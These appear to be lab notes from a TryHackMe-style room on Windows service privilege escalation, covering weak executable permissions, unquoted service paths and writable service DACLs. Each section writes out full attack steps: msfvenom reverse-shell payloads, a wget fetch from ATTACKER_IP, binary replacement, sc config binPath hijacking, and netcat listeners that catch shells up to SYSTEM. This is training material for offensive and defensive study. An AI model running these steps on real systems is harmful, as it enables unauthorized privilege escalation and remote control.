<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Windows Services</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Windows Services</h1><br/><h2>Windows Services</h2><br />Windows services are managed by the <strong>Service Control Manager</strong>  (SCM). The SCM is a process in charge of managing the state of services  as needed, checking the current status of any given service and  generally providing a way to configure services.<br />Each service on a Windows machine will have an associated executable  which will be run by the SCM whenever a service is started. It is  important to note that service executables implement special functions  to be able to communicate with the SCM, and therefore not any executable  can be started as a service successfully. Each service also specifies  the user account under which the service will run.<br />To better understand the structure of a service, let&#39;s check the apphostsvc service configuration with the <code>sc qc</code> command:<br />                        Command Prompt        <br />        <code>C:\&gt; sc qc apphostsvc<br />[SC] QueryServiceConfig SUCCESS<br /><br />SERVICE_NAME: apphostsvc<br />        TYPE               : 20  WIN32_SHARE_PROCESS<br />        START_TYPE         : 2   AUTO_START<br />        ERROR_CONTROL      : 1   NORMAL<br />        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost<br />        LOAD_ORDER_GROUP   :<br />        TAG                : 0<br />        DISPLAY_NAME       : Application Host Helper Service<br />        DEPENDENCIES       :<br />        SERVICE_START_NAME : localSystem</code><br />            <br /><br />Here we can see that the associated executable is specified through the <strong>BINARY_PATH_NAME</strong> parameter, and the account used to run the service is shown on the <strong>SERVICE_START_NAME</strong> parameter.<br />Services have a Discretionary Access Control List (DACL),  which indicates who has permission to start, stop, pause, query status,  query configuration, or reconfigure the service, amongst other  privileges. The DACL can be seen from Process Hacker (available on your  machine&#39;s desktop):<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png"><img src="images/27-1.png" alt="images/27-1.png" /></a><br /><br />All of the services configurations are stored on the registry under <code>HKLM\SYSTEM\CurrentControlSet\Services\</code>:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png"><img src="images/27-2.png" alt="images/27-2.png" /></a><br /><br />A subkey exists for every service in the system. Again, we can see the associated executable on the <strong>ImagePath</strong> value and the account used to start the service on the <strong>ObjectName</strong> value. If a DACL has been configured for the service, it will be stored in a subkey called <strong>Security</strong>. As you have guessed by now, only administrators can modify such registry entries by default.<br /><br /><br /><br /><h2>Insecure Permissions on Service Executable</h2><br />If the executable associated with a service has weak permissions that  allow an attacker to modify or replace it, the attacker can gain the  privileges of the service&#39;s account trivially.<br />To understand how this works, let&#39;s look at a vulnerability found on  Splinterware System Scheduler. To start, we will query the service  configuration using <code>sc</code>:<br />                        Command Prompt        <br />        <code>C:\&gt; sc qc WindowsScheduler<br />[SC] QueryServiceConfig SUCCESS<br /><br />SERVICE_NAME: windowsscheduler<br />        TYPE               : 10  WIN32_OWN_PROCESS<br />        START_TYPE         : 2   AUTO_START<br />        ERROR_CONTROL      : 0   IGNORE<br />        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe<br />        LOAD_ORDER_GROUP   :<br />        TAG                : 0<br />        DISPLAY_NAME       : System Scheduler Service<br />        DEPENDENCIES       :<br />        SERVICE_START_NAME : .\svcuser1</code><br />            <br /><br />We can see that the service installed by the vulnerable software runs  as svcuser1 and the executable associated with the service is in <code>C:\Progra~2\System~1\WService.exe</code>. We then proceed to check the permissions on the executable:<br />                        Command Prompt        <br />        <code>C:\Users\thm-unpriv&gt;icacls C:\PROGRA~2\SYSTEM~1\WService.exe<br />C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)<br />                                  NT AUTHORITY\SYSTEM:(I)(F)<br />                                  BUILTIN\Administrators:(I)(F)<br />                                  BUILTIN\Users:(I)(RX)<br />                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)<br />                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)<br /><br />Successfully processed 1 files; Failed processing 0 files</code><br />            <br /><br />And here we have something interesting. The Everyone group has modify  permissions (M) on the service&#39;s executable. This means we can simply  overwrite it with any payload of our preference, and the service will  execute it with the privileges of the configured user account.<br />Let&#39;s generate an exe-service payload using msfvenom and serve it through a python webserver:<br />                         Kali Linux         <br />        <code>user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe<br /><br />user@attackerpc$ python3 -m http.server<br />Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code><br />            <br /><br />We can then pull the payload from Powershell with the following command:<br />                        Powershell        <br />        <code>wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</code><br />            <br /><br />Once the payload is in the Windows server, we proceed to replace the  service executable with our payload. Since we need another user to  execute our payload, we&#39;ll want to grant full permissions to the  Everyone group as well:<br />                        Command Prompt        <br />        <code>C:\&gt; cd C:\PROGRA~2\SYSTEM~1\<br /><br />C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp<br />        1 file(s) moved.<br /><br />C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe<br />        1 file(s) moved.<br /><br />C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F<br />        Successfully processed 1 files.</code><br />            <br /><br />We start a reverse listener on our attacker machine:<br />                         Kali Linux         <br />        <code>user@attackerpc$ nc -lvp 4445</code><br />            <br /><br />And finally, restart the service. While in a normal scenario, you  would likely have to wait for a service restart, you have been assigned  privileges to restart the service yourself to save you some time. Use  the following commands from a cmd.exe command prompt:<br />                        Command Prompt        <br />        <code>C:\&gt; sc stop windowsscheduler<br />C:\&gt; sc start windowsscheduler</code><br />            <br /><br /><strong>Note:Â </strong>PowerShell has <code>sc</code> as an alias to <code>Set-Content</code>, therefore you need to use <code>sc.exe</code> in order to control services with PowerShell this way.<br />As a result, you&#39;ll get a reverse shell with svcusr1 privileges:<br />                         Kali Linux         <br />        <code>user@attackerpc$ nc -lvp 4445<br />Listening on 0.0.0.0 4445<br />Connection received on 10.10.175.90 50649<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation. All rights reserved.<br /><br />C:\Windows\system32&gt;whoami<br />wprivesc1\svcusr1</code><br />            <br /><br />Go to svcusr1 desktop to retrieve a flag. Don&#39;t forget to input the flag at the end of this task.<br /><br /><br /><br /><h2>Unquoted Service Paths</h2><br />When we can&#39;t directly write into service executables as before,  there might still be a chance to force a service into running arbitrary  executables by using a rather obscure feature.<br />When working with Windows services, a very particular behaviour  occurs when the service is configured to point to an &quot;unquoted&quot;  executable. By unquoted, we mean that the path of the associated  executable isn&#39;t properly quoted to account for spaces on the command.<br />As an example, let&#39;s look at the difference between two services  (these services are used as examples only and might not be available in  your machine). The first service will use a proper quotation so that the  SCM knows without a doubt that it has to execute the binary file  pointed by <code>&quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot;</code>, followed by the given parameters:<br />                        Command Prompt        <br />        <code>C:\&gt; sc qc &quot;vncserver&quot;<br />[SC] QueryServiceConfig SUCCESS<br /><br />SERVICE_NAME: vncserver<br />        TYPE               : 10  WIN32_OWN_PROCESS<br />        START_TYPE         : 2   AUTO_START<br />        ERROR_CONTROL      : 0   IGNORE<br />        BINARY_PATH_NAME   : &quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot; -service<br />        LOAD_ORDER_GROUP   :<br />        TAG                : 0<br />        DISPLAY_NAME       : VNC Server<br />        DEPENDENCIES       :<br />        SERVICE_START_NAME : LocalSystem</code><br />            <br /><br /><strong>Remember: PowerShell  has &#39;sc&#39; as an alias to &#39;Set-Content&#39;, therefore you need to use  &#39;sc.exe&#39; to control services if you are in a PowerShell prompt.</strong><br />Now let&#39;s look at another service without proper quotation:<br />                        Command Prompt        <br />        <code>C:\&gt; sc qc &quot;disk sorter enterprise&quot;<br />[SC] QueryServiceConfig SUCCESS<br /><br />SERVICE_NAME: disk sorter enterprise<br />        TYPE               : 10  WIN32_OWN_PROCESS<br />        START_TYPE         : 2   AUTO_START<br />        ERROR_CONTROL      : 0   IGNORE<br />        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe<br />        LOAD_ORDER_GROUP   :<br />        TAG                : 0<br />        DISPLAY_NAME       : Disk Sorter Enterprise<br />        DEPENDENCIES       :<br />        SERVICE_START_NAME : .\svcusr2</code><br />            <br /><br />When the SCM tries to execute the associated binary, a problem  arises. Since there are spaces on the name of the &quot;Disk Sorter  Enterprise&quot; folder, the command becomes ambiguous, and the SCM doesn&#39;t  know which of the following you are trying to execute:<br /><table class="table"><tr><th> </th><th> </th><th> </th></tr><tr><td>Command</td><td>Argument 1</td><td>Argument 2</td></tr><tr><td>C:\MyPrograms\Disk.exe</td><td>Sorter</td><td>Enterprise\bin\disksrs.exe</td></tr><tr><td>C:\MyPrograms\Disk Sorter.exe</td><td>Enterprise\bin\disksrs.exe</td><td> </td></tr><tr><td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td><td> </td><td> </td></tr></table><br /><br /><br />This has to do with how the command prompt parses a command. Usually,  when you send a command, spaces are used as argument separators unless  they are part of a quoted string. This means the &quot;right&quot; interpretation  of the unquoted command would be to execute <code>C:\\MyPrograms\\Disk.exe</code> and take the rest as arguments.<br />Instead of failing as it probably should, SCM tries to help the user  and starts searching for each of the binaries in the order shown in the  table:<br />1. First, search for <code>C:\\MyPrograms\\Disk.exe</code>. If it exists, the service will run this executable.<br />2. If the latter doesn&#39;t exist, it will then search for <code>C:\\MyPrograms\\Disk Sorter.exe</code>. If it exists, the service will run this executable.<br />3. If the latter doesn&#39;t exist, it will then search for <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>. This option is expected to succeed and will typically be run in a default installation.<br />From this behaviour, the problem becomes evident. If an attacker  creates any of the executables that are searched for before the expected  service executable, they can force the service to run an arbitrary  executable.<br />While this sounds trivial, most of the service executables will be installed under <code>C:\Program Files</code> or <code>C:\Program Files (x86)</code>  by default, which isn&#39;t writable by unprivileged users. This prevents  any vulnerable service from being exploited. There are exceptions to  this rule: - Some installers change the permissions on the installed  folders, making the services vulnerable. - An administrator might decide  to install the service binaries in a non-default path. If such a path  is world-writable, the vulnerability can be exploited.<br />In our case, the Administrator installed the Disk Sorter binaries under <code>c:\MyPrograms</code>. By default, this inherits the permissions of the <code>C:\</code> directory, which allows any user to create files and folders in it. We can check this using <code>icacls</code>:<br />                        Command Prompt        <br />        <code>C:\&gt;icacls c:\MyPrograms<br />c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)<br />              BUILTIN\Administrators:(I)(OI)(CI)(F)<br />              BUILTIN\Users:(I)(OI)(CI)(RX)<br />              BUILTIN\Users:(I)(CI)(AD)<br />              BUILTIN\Users:(I)(CI)(WD)<br />              CREATOR OWNER:(I)(OI)(CI)(IO)(F)<br /><br />Successfully processed 1 files; Failed processing 0 files</code><br />            <br /><br />The <code>BUILTIN\\Users</code> group has <strong>AD</strong> and <strong>WD</strong> privileges, allowing the user to create subdirectories and files, respectively.<br />The process of creating an exe-service payload with msfvenom and  transferring it to the target host is the same as before, so feel free  to create the following payload and upload it to the server as before.  We will also start a listener to receive the reverse shell when it gets  executed:<br />                         Kali Linux         <br />        <code>user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe<br /><br />user@attackerpc$ nc -lvp 4446</code><br />            <br /><br />Once the payload is in the server, move it to any of the locations  where hijacking might occur. In this case, we will be moving our payload  to <code>C:\MyPrograms\Disk.exe</code>. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:<br />                        Command Prompt        <br />        <code>C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe<br /><br />C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F<br />        Successfully processed 1 files.</code><br />            <br /><br />Once the service gets restarted, your payload should execute:<br />                        Command Prompt        <br />        <code>C:\&gt; sc stop &quot;disk sorter enterprise&quot;<br />C:\&gt; sc start &quot;disk sorter enterprise&quot;</code><br />            <br /><br />As a result, you&#39;ll get a reverse shell with svcusr2 privileges:<br />                         Kali Linux         <br />        <code>user@attackerpc$ nc -lvp 4446<br />Listening on 0.0.0.0 4446<br />Connection received on 10.10.175.90 50650<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation. All rights reserved.<br /><br />C:\Windows\system32&gt;whoami<br />wprivesc1\svcusr2</code><br />            <br /><br />Go to svcusr2 desktop to retrieve a flag. Don&#39;t forget to input the flag at the end of this task.<br /><br /><br /><br /><h2>Insecure Service Permissions</h2><br />You might still have a slight chance of taking advantage of a service if the service&#39;s executable DACL  is well configured, and the service&#39;s binary path is rightly quoted.  Should the service DACL (not the service&#39;s executable DACL) allow you to  modify the configuration of a service, you will be able to reconfigure  the service. This will allow you to point to any executable you need and  run it with any account you prefer, including SYSTEM itself.<br />To check for a service DACL from the command line, you can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a> from the Sysinternals suite. For your convenience, a copy is available at <code>C:\\tools</code>. The command to check for the thmservice service DACL is:<br />                        Command Prompt        <br />        <code>C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice<br />  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM<br />        SERVICE_QUERY_STATUS<br />        SERVICE_QUERY_CONFIG<br />        SERVICE_INTERROGATE<br />        SERVICE_ENUMERATE_DEPENDENTS<br />        SERVICE_PAUSE_CONTINUE<br />        SERVICE_START<br />        SERVICE_STOP<br />        SERVICE_USER_DEFINED_CONTROL<br />        READ_CONTROL<br />  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users<br />        SERVICE_ALL_ACCESS</code><br />            <br /><br />Here we can see that the <code>BUILTIN\\Users</code> group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.<br />Before changing the service, let&#39;s build another exe-service reverse  shell and start a listener for it on the attacker&#39;s machine:<br />                         Kali Linux         <br />        <code>user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe<br /><br />user@attackerpc$ nc -lvp 4447</code><br />            <br /><br />We will then transfer the reverse shell executable to the target machine and store it in <code>C:\Users\thm-unpriv\rev-svc3.exe</code>.  Feel free to use wget to transfer your executable and move it to the  desired location. Remember to grant permissions to Everyone to execute  your payload:<br />                        Command Prompt        <br />        <code>C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</code><br />            <br /><br />To change the service&#39;s associated executable and account, we can use  the following command (mind the spaces after the equal signs when using  sc.exe):<br />                        Command Prompt        <br />        <code>C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</code><br />            <br /><br />Notice we can use any account to run the service. We chose  LocalSystem as it is the highest privileged account available. To  trigger our payload, all that rests is restarting the service:<br />                        Command Prompt        <br />        <code>C:\&gt; sc stop THMService<br />C:\&gt; sc start THMService</code><br />            <br /><br />And we will receive a shell back in our attacker&#39;s machine with SYSTEM privileges:<br />                         Kali Linux         <br />        <code>user@attackerpc$ nc -lvp 4447<br />Listening on 0.0.0.0 4447<br />Connection received on 10.10.175.90 50650<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation. All rights reserved.<br /><br />C:\Windows\system32&gt;whoami<br />NT AUTHORITY\SYSTEM</code></div></body></html>